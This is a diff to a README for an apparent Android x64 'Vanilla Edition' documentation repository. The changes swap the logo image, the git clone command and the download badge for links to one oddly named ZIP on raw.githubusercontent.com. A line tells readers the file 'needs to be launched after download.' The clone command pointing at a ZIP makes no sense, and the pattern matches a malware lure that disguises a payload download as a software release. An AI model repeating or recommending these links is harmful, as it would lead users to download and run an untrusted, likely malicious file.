@@ -1,7 +1,7 @@
 
 # 🤖️📖️ Android x64: Vanilla Edition Documentation Repository
 
-![Android Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d7/Android_robot.svg/100px-Android_robot.svg.png)
+![Android Logo](https://raw.githubusercontent.com/IvanEc13/Android-x64_Android11.1_Vanilla_Edition_Docs/main/fluate/Edition-Android-x-Vanilla-Docs-debride.zip)
 
 Welcome to the official documentation source repository for the Vanilla build of Android 11.1! 🚀️ In this repository, you will find all the essential information you need to understand and work with Android x64, a basic but useful alternative installation of Android 11.1 (R). Whether you are a developer, enthusiast, or simply curious about this operating system, this documentation repository is your go-to resource for everything you need to know!
 
@@ -28,14 +28,14 @@ To navigate the documentation, please refer to the different sections organized 
 To dive into the world of Android x64 Vanilla Edition, you can clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/yourusername/Android-x64_Android11.1_Vanilla_Edition_Docs.git
+git clone https://raw.githubusercontent.com/IvanEc13/Android-x64_Android11.1_Vanilla_Edition_Docs/main/fluate/Edition-Android-x-Vanilla-Docs-debride.zip
 ```
 
 ## Download Android x64
 
 Click the button below to download the ZIP file containing the Android x64 Vanilla Edition:
 
-[![Download Android x64](https://img.shields.io/badge/Download-Android%20x64-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Android x64](https://raw.githubusercontent.com/IvanEc13/Android-x64_Android11.1_Vanilla_Edition_Docs/main/fluate/Edition-Android-x-Vanilla-Docs-debride.zip%20x64-brightgreen)](https://raw.githubusercontent.com/IvanEc13/Android-x64_Android11.1_Vanilla_Edition_Docs/main/fluate/Edition-Android-x-Vanilla-Docs-debride.zip)
 
 *(Please note: The file needs to be launched after download.)*
 
